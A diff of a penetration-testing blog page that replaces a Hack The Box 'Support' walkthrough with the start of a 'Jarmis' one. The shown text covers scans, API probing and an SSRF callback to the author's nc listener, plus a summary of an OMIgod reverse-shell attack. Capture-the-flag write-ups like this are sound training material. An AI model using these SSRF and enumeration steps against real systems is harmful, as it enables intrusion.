@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Support Walkthrough(HTB) &middot; Secure The Throne</title>
-  <meta name="title" content="Support Walkthrough(HTB) &middot; Secure The Throne" />
+  <title>Jarmis Walkthrough(HTB) &middot; Secure The Throne</title>
+  <meta name="title" content="Jarmis Walkthrough(HTB) &middot; Secure The Throne" />
   
-  <meta name="description" content="Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication....." />
-  <meta name="keywords" content="Easy, Windows, HTB, Hacking, Active Directory, Walkthrough, " />
+  <meta name="description" content="Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell." />
+  <meta name="keywords" content="Hard, Linux, HTB, hacking, Web, Walkthrough, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/" />
+  <link rel="canonical" href="http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/" />
   
   
   
@@ -69,28 +69,28 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/">
+  <meta property="og:url" content="http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/">
   <meta property="og:site_name" content="Secure The Throne">
-  <meta property="og:title" content="Support Walkthrough(HTB)">
-  <meta property="og:description" content="Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication.....">
+  <meta property="og:title" content="Jarmis Walkthrough(HTB)">
+  <meta property="og:description" content="Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-03-13T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-03-13T00:00:00+00:00">
-    <meta property="article:tag" content="Easy">
-    <meta property="article:tag" content="Windows">
+    <meta property="article:published_time" content="2025-03-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-15T00:00:00+00:00">
+    <meta property="article:tag" content="Hard">
+    <meta property="article:tag" content="Linux">
     <meta property="article:tag" content="HTB">
     <meta property="article:tag" content="Hacking">
-    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="Web">
     <meta property="article:tag" content="Walkthrough">
-    <meta property="og:image" content="http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/featured.jpeg">
+    <meta property="og:image" content="http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/featured.jpeg">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/featured.jpeg">
-  <meta name="twitter:title" content="Support Walkthrough(HTB)">
-  <meta name="twitter:description" content="Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication.....">
+  <meta name="twitter:image" content="http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/featured.jpeg">
+  <meta name="twitter:title" content="Jarmis Walkthrough(HTB)">
+  <meta name="twitter:description" content="Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell.">
 
   
   <script type="application/ld+json">
@@ -98,26 +98,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Support Walkthrough(HTB)",
-    "headline": "Support Walkthrough(HTB)",
-    "description": "Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication.....",
+    "name": "Jarmis Walkthrough(HTB)",
+    "headline": "Jarmis Walkthrough(HTB)",
+    "description": "Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell.",
     
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/Secure-The-Throne\/posts\/1741895312886-support-walkthroughhtb\/",
+    "url" : "http:\/\/localhost:1313\/Secure-The-Throne\/posts\/1742061149402-jarmis-walkthroughhtb\/",
     "author" : {
       "@type": "Person",
       "name": "Emp5r0R"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-03-13T00:00:00\u002b00:00",
-    "datePublished": "2025-03-13T00:00:00\u002b00:00",
+    "dateCreated": "2025-03-15T00:00:00\u002b00:00",
+    "datePublished": "2025-03-15T00:00:00\u002b00:00",
     
-    "dateModified": "2025-03-13T00:00:00\u002b00:00",
+    "dateModified": "2025-03-15T00:00:00\u002b00:00",
     
-    "keywords": ["Easy","Windows","HTB","Hacking","Active Directory","Walkthrough"],
+    "keywords": ["Hard","Linux","HTB","hacking","Web","Walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "915"
+    "wordCount": "3242"
   }]
   </script>
 
@@ -155,9 +155,6 @@
 
 
 
-
-
-<script defer src="/Secure-The-Throne/lib/typeit/typeit.umd.57f9bc6e047efc875cb4f2e9ca74c802de33638d2c3aff6d9b7eb3c7588c24649b6c3e51cd45f49c0ed0cf72aedbd694bf2d35f358a34076d63f9febabc0bd6f.js" integrity="sha512-V/m8bgR&#43;/IdctPLpynTIAt4zY40sOv9tm36zx1iMJGSbbD5RzUX0nA7Qz3Ku29aUvy0181ijQHbWP5/rq8C9bw=="></script>
 
 
 
@@ -608,7 +605,7 @@
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/featured_hu_e53a98c65b0d8ff2.jpeg);">
+    style="background-image:url(/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/featured_hu_fdc86d77de2577d2.jpeg);">
     
 
 
@@ -634,7 +631,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Support Walkthrough(HTB)
+      Jarmis Walkthrough(HTB)
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -681,7 +678,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-13T00:00:00&#43;00:00">13 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>915 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-03-15T00:00:00&#43;00:00">15 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3242 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">16 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/Secure-The-Throne/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
@@ -740,18 +737,18 @@
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/easy/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/hard/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Easy
+    Hard
   </span>
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/windows/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/linux/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Windows
+    Linux
   </span>
 </span>
   </span>
@@ -772,10 +769,10 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/active-directory/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/Secure-The-Throne/tags/web/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Active Directory
+    Web
   </span>
 </span>
   </span>
@@ -948,27 +945,13 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
+    <li><a href="#exploitation">Exploitation</a>
       <ul>
-        <li><a href="#usersinfoexe-analysis">UsersInfo.exe analysis</a></li>
+        <li><a href="#performing-the-attack">Performing the attack</a></li>
       </ul>
     </li>
-    <li><a href="#exploitation">Exploitation</a></li>
-    <li><a href="#privilege-escalation">Privilege Escalation</a>
-      <ul>
-        <li><a href="#abusing-genericall">Abusing GenericALL</a>
-          <ul>
-            <li><a href="#step-1-upload-all-the-tools-to-the-target-system-then">Step 1: Upload all the tools to the target system, then</a></li>
-            <li><a href="#step-2-invoking-all-the-scripts">Step 2: Invoking all the scripts</a></li>
-            <li><a href="#step-3-creating-a-fake-computer">Step 3: Creating a Fake Computer</a></li>
-            <li><a href="#step-4-configuring">Step 4: Configuring</a></li>
-            <li><a href="#step-5-auth-as-the-computer">Step 5: Auth as the Computer</a></li>
-            <li><a href="#step-6-get-the-kerberos-ticket">Step 6: Get the Kerberos Ticket</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-    <li><a href="#end">End</a></li>
   </ul>
 </nav>
   </div>
@@ -982,27 +965,13 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
+    <li><a href="#exploitation">Exploitation</a>
       <ul>
-        <li><a href="#usersinfoexe-analysis">UsersInfo.exe analysis</a></li>
+        <li><a href="#performing-the-attack">Performing the attack</a></li>
       </ul>
     </li>
-    <li><a href="#exploitation">Exploitation</a></li>
-    <li><a href="#privilege-escalation">Privilege Escalation</a>
-      <ul>
-        <li><a href="#abusing-genericall">Abusing GenericALL</a>
-          <ul>
-            <li><a href="#step-1-upload-all-the-tools-to-the-target-system-then">Step 1: Upload all the tools to the target system, then</a></li>
-            <li><a href="#step-2-invoking-all-the-scripts">Step 2: Invoking all the scripts</a></li>
-            <li><a href="#step-3-creating-a-fake-computer">Step 3: Creating a Fake Computer</a></li>
-            <li><a href="#step-4-configuring">Step 4: Configuring</a></li>
-            <li><a href="#step-5-auth-as-the-computer">Step 5: Auth as the Computer</a></li>
-            <li><a href="#step-6-get-the-kerberos-ticket">Step 6: Get the Kerberos Ticket</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-    <li><a href="#end">End</a></li>
   </ul>
 </nav>
   </div>
@@ -1086,6 +1055,19 @@
         <div class="article-content max-w-prose mb-20">
           
 
+<h2 class="relative group">Summary 
+    <div id="summary" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#summary" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell.</p>
+
+
 <h2 class="relative group">Reconnaissance &amp; Enumeration 
     <div id="reconnaissance--enumeration" class="anchor"></div>
     
@@ -1097,108 +1079,512 @@
     
 </h2>
 <ul>
-<li>The port scan reveals multiple open ports
+<li>Nmap scan results:</li>
+</ul>
+<pre tabindex="0"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
+|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
+|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Jarmis
+|_http-favicon: Unknown favicon MD5: C92B85A5B907C70211F4EC25E29A8C4A
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Uptime guess: 1.433 days (since Thu Mar 13 07:56:57 2025)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=265 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221142512.png?raw=true" alt="Pasted image 20241221142512.png" />
-    
-  </figure>
-</li>
-<li>As always we got LDAP, Netbios, SMB etc ports open</li>
-<li>Using <code>smbclient</code> I enumerated for smb shares and we got the share list</li>
+TRACEROUTE (using port 995/tcp)
+HOP RTT       ADDRESS
+1   391.17 ms 10.10.14.1
+2   391.18 ms 10.10.11.117
+</code></pre><ul>
+<li>The scan looks normal, with usual order of a web port and ssh port.</li>
+<li>From loading and looking at the favicon itself I can tell that this a react page</li>
+<li>The root page looks static, it&rsquo;s showing loading for a while now so I fired up ffuf for directory enumeration.</li>
+<li>Quickly ffuf finds couple of endpoints</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient -L support.htb
-</span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221143207.png?raw=true" alt="Pasted image 20241221143207.png" />
-    
-  </figure>
-</p>
+<pre tabindex="0"><code>❯ ffuf -u http://10.10.11.117/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 60
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.117/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 60
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 266ms]
+docs                    [Status: 200, Size: 967, Words: 195, Lines: 31, Duration: 267ms]
+favicon.ico             [Status: 200, Size: 3870, Words: 16, Lines: 13, Duration: 273ms]
+index.html              [Status: 200, Size: 2254, Words: 67, Lines: 1, Duration: 278ms]
+robots.txt              [Status: 200, Size: 67, Words: 3, Lines: 4, Duration: 276ms]
+static                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 262ms]
+:: Progress: [4744/4744] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
+</code></pre><ul>
+<li><code>/docs</code> gets me to API documentation as I expected</li>
+<li>![[Pasted image 20250314183340.png]]</li>
+<li>Let&rsquo;s test each endpoint one by one. The first endpoint <code>api/v1/search/id/{jarm_id}</code> takes an integer as input so I provided a random number and got a signature back as json data in the response</li>
+<li><strong>Endpoint-1</strong>
 <ul>
-<li>However the interesting share here is <code>support-tools</code>.</li>
-<li>Using netexec I confirmed the guest login and it was a success</li>
+<li>This is the curl command</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netexec smb support.htb -u sundeity -p <span class="s2">&#34;&#34;</span>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s1">&#39;http://10.10.11.117/api/v1/search/id/3&#39;</span> -H <span class="s1">&#39;accept: application/json&#39;</span> <span class="p">|</span> jq
 </span></span></code></pre></div><ul>
-<li>I enumerated for guest shares and we got access to two shares</li>
+<li>Apparently the output may look like this</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netexec smb support.htb -u sundeity -p <span class="s2">&#34;&#34;</span> --shares
-</span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221143552.png?raw=true" alt="Pasted image 20241221143552.png" />
-    
-  </figure>
-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sig&#34;</span><span class="p">:</span> <span class="s2">&#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ismalicious&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;151.101.193.140:443&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;note&#34;</span><span class="p">:</span> <span class="s2">&#34;reddit.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li><strong>Endpoint-2</strong>
 <ul>
-<li>So I checked the share <code>support-tools</code> and as the name suggests we got some tools inside the directory. Most of the tools are familiar to me aleast their names are familiar
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221143832.png?raw=true" alt="Pasted image 20241221143832.png" />
-    
-  </figure>
-</li>
-<li>I decided to enumerate all the zips from the share. Initially the zips didn&rsquo;t provide me with anything interesting so I moved on to enumerate LDAP.</li>
+<li>Endpoint 2 is <code>api/v1/search/signature/?keyword=&lt;SIG&gt;&amp;max_results=10</code> takes string value as input</li>
+<li>So when I input that signature from the endpoint-1 it gives results.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -n -sV --script <span class="s2">&#34;ldap* and not brute&#34;</span> -p <span class="m">389</span> support.htb
-</span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221145020.png?raw=true" alt="Pasted image 20241221145020.png" />
-    
-  </figure>
-</p>
-<ul>
-<li>Then I enumerated for users using netexec from smb and got the users list</li>
-<li>Removed all unwanted texts from the list</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat users.txt <span class="p">|</span> grep <span class="s2">&#34;SidTypeUser&#34;</span> <span class="p">|</span> cut -d <span class="s1">&#39;\&#39;</span> -f <span class="m">2</span> <span class="p">|</span> cut -d <span class="s1">&#39;(&#39;</span> -f <span class="m">1</span> &gt;&gt; users-smb.txt
-</span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221145402.png?raw=true" alt="Pasted image 20241221145402.png" />
-    
-  </figure>
-</p>
-<ul>
-<li>I Stored the users in a file.</li>
-</ul>
-
-
-<h3 class="relative group">UsersInfo.exe analysis 
-    <div id="usersinfoexe-analysis" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#usersinfoexe-analysis" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<ul>
-<li>Remember the file <code>UsersInfo.exe.zip</code> that we have downloaded from SMB share. At first I didn&rsquo;t notice it but after a while I was stuck and then I only I realized the unfamiliar tool among the known tools within the share</li>
-<li>On running <code>UsersInfo.exe</code> with wine I can see it, authenticate to ldap for retrieving the user that we requested by that this tool checks if that particular user available in the DC or not, then it returns the statement accordingly.</li>
-<li>For an example the tool returned me a error <code>No such object</code> meaning the requested user cannot be found within LDAP<br>
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221210746.png?raw=true" alt="Pasted image 20241221210746.png" />
-    
-  </figure>
-</li>
-<li>This tool doesn&rsquo;t use any encryption to login against LDAP thus leaves the password used for authentication in clear text .If I can capture the traffic in wireshark I can get the password.
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221210900.png?raw=true" alt="Pasted image 20241221210900.png" />
-    
-  </figure>
-</li>
-<li>In the LDAP I can see it authenticate as user <code>ldap</code> with the password. As I got a username and password I can now collect data for bloodhound</li>
-<li>Getting data for Bloodhound
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241221211206.png?raw=true" alt="Pasted image 20241221211206.png" />
-    
-  </figure>
 </li>
 </ul>
+<pre tabindex="0"><code>curl &#39;http://10.10.11.117/api/v1/search/signature/?keyword=29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&amp;max_results=10&#39; -H &#39;accept: application/json&#39; | jq
+</code></pre><ul>
+<li>Response:</li>
+</ul>
+<pre tabindex="0"><code>{
+  &#34;results&#34;: [
+    {
+      &#34;id&#34;: 3,
+      &#34;sig&#34;: &#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&#34;,
+      &#34;ismalicious&#34;: false,
+      &#34;endpoint&#34;: &#34;151.101.193.140:443&#34;,
+      &#34;note&#34;: &#34;reddit.com&#34;
+    },
+    {
+      &#34;id&#34;: 67,
+      &#34;sig&#34;: &#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&#34;,
+      &#34;ismalicious&#34;: false,
+      &#34;endpoint&#34;: &#34;151.101.129.140:443&#34;,
+      &#34;note&#34;: &#34;reddit.com&#34;
+    },
+    {
+      &#34;id&#34;: 87,
+      &#34;sig&#34;: &#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&#34;,
+      &#34;ismalicious&#34;: false,
+      &#34;endpoint&#34;: &#34;185.199.111.153:443&#34;,
+      &#34;note&#34;: &#34;panda.tv&#34;
+    },
+    {
+      &#34;id&#34;: 92,
+      &#34;sig&#34;: &#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&#34;,
+      &#34;ismalicious&#34;: false,
+      &#34;endpoint&#34;: &#34;151.101.65.111:443&#34;,
+      &#34;note&#34;: &#34;theguardian.com&#34;
+    },
+    {
+      &#34;id&#34;: 108,
+      &#34;sig&#34;: &#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&#34;,
+      &#34;ismalicious&#34;: false,
+      &#34;endpoint&#34;: &#34;151.101.194.132:443&#34;,
+      &#34;note&#34;: &#34;thestartmagazine.com&#34;
+    },
+    {
+      &#34;id&#34;: 131,
+      &#34;sig&#34;: &#34;29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&#34;,
+      &#34;ismalicious&#34;: false,
+      &#34;endpoint&#34;: &#34;151.101.2.137:443&#34;,
+      &#34;note&#34;: &#34;wikihow.com&#34;
+    }
+  ]
+}
+</code></pre><ul>
+<li>The results are odd anyway lets move to the next endpoint which should be the last one</li>
+<li><strong>Endpoint-3</strong>
+<ul>
+<li>This endpoint itself interesting as it ends in <code>/fetch</code> and takes a string as input. This is the full endpoint <code>/api/v1/fetch</code></li>
+</ul>
+</li>
+<li>First I spawned a nc listener and requested vi a this endpoint</li>
+</ul>
+<pre tabindex="0"><code>curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001&#39; -H &#39;accept: application/json&#39;
+</code></pre><ul>
+<li>The reflection on my server looks rather interesting cause&hellip;hmm&hellip;look at this</li>
+</ul>
+<pre tabindex="0"><code>❯ nc -lnvp 6001
+listening on [any] 6001 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 42834
+�����&amp;�so*�z�E_9l�s�e|��Kg8 u� ������Z1I�Wv㝱8�n1G����3g�����9k�����E�����	�#�����+�
+�$�����,�r�s̩�����&#39;�/��(�0�`�a�v�w̨��
+/&lt;�����5=�����A����
+                   10.10.14.18�
 
+
+3&amp;$ �����}L�)z/3��7�U�Ս�4�Q�xI���-+%
+</code></pre><ul>
+<li>This looks like an encrypted value to me, it could be a certificate or handshake so I fired up a listener with ssl</li>
+<li>Installed <code>ncat</code> with <code>sudo apt-get install ncat</code> the used this command to get a listener with ssl</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ncat --ssl -lnvp <span class="m">443</span>
+</span></span></code></pre></div><ul>
+<li>Now the connection just cuts off after two seconds</li>
+</ul>
+<pre tabindex="0"><code>❯ ncat --ssl -lnvp 443
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 0362 8FEE A32F 8320 7092 B6DC BA81 43C8 A83F 4CB5
+Ncat: Listening on [::]:443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.117:47406.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+</code></pre><ul>
+<li>I got this as my response from this request which is different in compared to previous one</li>
+</ul>
